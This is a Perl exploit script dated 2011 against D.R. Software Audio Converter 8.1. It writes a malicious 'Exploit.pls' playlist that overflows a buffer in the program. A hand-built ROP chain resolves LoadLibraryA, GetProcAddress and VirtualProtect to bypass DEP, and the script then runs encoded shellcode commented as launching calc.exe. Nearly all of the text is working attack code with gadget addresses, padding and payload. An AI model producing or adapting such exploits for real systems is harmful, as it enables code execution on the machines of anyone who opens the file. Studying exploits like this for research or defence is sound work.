#!/usr/bin/perl
#
#[+]Exploit Title: D.R. Software Audio Converter 8.1 DEP Bypass Exploit
#[+]Date: 13\08\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://download.cnet.com/Audio-Converter/3000-2140_4-10045287.html
#[+]Found By: Sud0 from Corelan Team(http://www.exploit-db.com/exploits/13760/) or also created KedAns-Dz(http://1337day.com/exploits/16248)
#[+]Version: 8.1
#[+]Tested On: WIN-XP SP3 Brazilian Portuguese
#[+]CVE: N/A
#


print q{

		Created By C4SS!0 G0M3S
		E-mail louredo_@hotmail.com
		Site net-fuzzer.blogspot.com
};
print "\n\t\t[+]Creating Exploit File...\n";
sleep(2);
#####################################ROP FOR LoadLibraryA##############################
my $rop = pack('V',0x00430076);  # POP ECX # RETN 
$rop .= pack('V',0x0044B274); # Endereco de LoadLibraryA
$rop .= pack('V',0x1003d56e); # POP ESI # RETN
$rop .= pack('V',0x10055FBD); # MOV EAX,DWORD PTR DS:[ECX] # JMP EAX // And JMP to LoadLibraryA
$rop .= pack('V',0x10068022); # POP EBP # RETN 
$rop .= pack('V',0x1003AA1A); # ADD ESP,28 # RETN 04
$rop .= pack('V',0x0040aaf2); # POP EDI # RETN 
$rop .= pack('V',0x1002ef15); #RETN
$rop .= pack('V',0x1002ef14); # PUSHAD # RETN
$rop .= "kernel32.dll\x00";
$rop .= "A" x 11;
#####################################ROP END HERE#######################################

#####################################ROP FOR GetProcAddress#############################
$rop .= pack('V',0x1002ef15) x 3; #RETN
$rop .= pack('V',0x00430076);  # POP ECX # RETN
$rop .= pack('V',0x0044B1E8);  # Endereco de GetProcAddress
$rop .= pack('V',0x0040aaf2);  # POP EDI # RETN 
$rop .= pack('V',0x10055FBD);  # MOV EAX,DWORD PTR DS:[ECX] # JMP EAX // And JMP to GetProcAddress
$rop .= pack('V',0x1006809f);  # POP ESI # RETN 
$rop .= pack('V',0x1003AA1A);  # ADD ESP,28 # RETN 04
$rop .= pack('V',0x00447b7d);  # XCHG EAX,EBP # RETN 
$rop .= pack('V',0x1002ef14);  # PUSHAD # RETN
$rop .= "VirtualProtect\x00";
$rop .= "D" x 9; # Junk
#####################################ROP END HERE#######################################

################################ROP FOR VirtualProtect##################################
$rop .= pack('V',0x1002ef15) x 4; #RETN
$rop .= pack('V',0x10037d05);  # XCHG EAX,ESI # RETN 
$rop .= pack('V',0x100753c0);  # PUSH ESP # POP EBP # POP EBX # ADD ESP,10 # RETN
$rop .= "A" x 20; # Junk
$rop .= pack('V',0x10015a15);  # XCHG EAX,EBP # RETN 
$rop .= pack('V',0x1004108e) x 20;  # ADD EAX,0A # RETN 
$rop .= pack('V',0x1007275D);  # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
$rop .= "A" x 4;
$rop .= pack('V',0x1002ef15) x 5; #RETN
$rop .= pack('V',0x10037d05); # XCHG EAX,ESI # RETN 
$rop .= pack('V',0x10068022);  # POP EBP # RETN 
$rop .= pack('V',0x0040A8F4);  # CALL ESP // Endere�o de retorno da fun�ao
$rop .= pack('V',0x100080ea);  # POP EBX # RETN 
$rop .= pack('V',0x00001000);  # Valor de dwSize
$rop .= pack('V',0x10082cde);  # POP EDX # RETN
$rop .= pack('V',0x00000040);  # Valor de flNewProtect
$rop .= pack('V',0x1007076e);  # POP EDI # RETN 
$rop .= pack('V',0x1002ef15);  # RETN
$rop .= pack('V',0x1002ef14);  # PUSHAD # RETN
$rop .= "\x90" x 25; # Some nops
$rop .= "\xeb\x10"; # Little jmp to fix shellcode. :)
$rop .= "\x90" x 20; # More nops
####################################ROP END HERE#####################################

my $shellcode = 
"\xb8\x4b\xaf\x2d\x0e\xda\xde\xd9\x74\x24\xf4\x5b\x29\xc9" .
"\xb1\x32\x83\xeb\xfc\x31\x43\x0e\x03\x08\xa1\xcf\xfb\x72" .
"\x55\x86\x04\x8a\xa6\xf9\x8d\x6f\x97\x2b\xe9\xe4\x8a\xfb" .
"\x79\xa8\x26\x77\x2f\x58\xbc\xf5\xf8\x6f\x75\xb3\xde\x5e" .
"\x86\x75\xdf\x0c\x44\x17\xa3\x4e\x99\xf7\x9a\x81\xec\xf6" .
"\xdb\xff\x1f\xaa\xb4\x74\x8d\x5b\xb0\xc8\x0e\x5d\x16\x47" .
"\x2e\x25\x13\x97\xdb\x9f\x1a\xc7\x74\xab\x55\xff\xff\xf3" .
"\x45\xfe\x2c\xe0\xba\x49\x58\xd3\x49\x48\x88\x2d\xb1\x7b" . # Shellcode Winexec "Calc.exe"
"\xf4\xe2\x8c\xb4\xf9\xfb\xc9\x72\xe2\x89\x21\x81\x9f\x89" . # Bad chars "\x00\x20\x3d\x0a\x0d\xff"
"\xf1\xf8\x7b\x1f\xe4\x5a\x0f\x87\xcc\x5b\xdc\x5e\x86\x57" .
"\xa9\x15\xc0\x7b\x2c\xf9\x7a\x87\xa5\xfc\xac\x0e\xfd\xda" .
"\x68\x4b\xa5\x43\x28\x31\x08\x7b\x2a\x9d\xf5\xd9\x20\x0f" .
"\xe1\x58\x6b\x45\xf4\xe9\x11\x20\xf6\xf1\x19\x02\x9f\xc0" .
"\x92\xcd\xd8\xdc\x70\xaa\x17\x97\xd9\x9a\xbf\x7e\x88\x9f" .
"\xdd\x80\x66\xe3\xdb\x02\x83\x9b\x1f\x1a\xe6\x9e\x64\x9c" .
"\x1a\xd2\xf5\x49\x1d\x41\xf5\x5b\x7e\x04\x65\x07\x81";

my $buf = "A" x 180;
$buf .= pack('V',0x1001bc95); # ADD ESP,1010 # RETN 04
$buf .= "A" x 4112;
$buf .= pack('V',0x10071916) x 2; # RETN
$buf .= pack('V',0x10071910); # ADD ESP,100 # RETN
$buf .= "C" x (4436-length($buf));
$buf .= pack('V',0x10029cfd);  # ADD ESP,814 # RETN 
$buf .= "A" x 124;
$buf .= $rop;
$buf .= $shellcode;
$buf .= "D" x (30000-length($buf));

open(f,">Exploit.pls") or die "[*]Error: $!\n";
print f $buf;
close f;
print "\t\t[+]File Exploit.pls Created successfully.\n";
sleep(1);